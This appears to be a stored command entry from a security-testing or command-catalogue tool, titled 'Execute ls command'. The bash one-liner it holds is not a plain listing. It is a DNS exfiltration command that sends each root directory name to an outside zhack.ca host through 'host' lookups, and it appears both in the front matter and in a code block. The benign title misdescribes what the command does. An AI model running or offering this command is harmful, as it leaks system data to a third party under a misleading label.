---
id: 02f1d920-f6b6-425c-8d08-0f884326807e
name: Execute ls command
type: command
executor: bash
data: for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
output: null
created_at: '2023-04-06T03:55:57.488902+00:00'
updated_at: '2023-04-06T03:55:57.503293+00:00'
---

# Execute ls command

```bash
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```
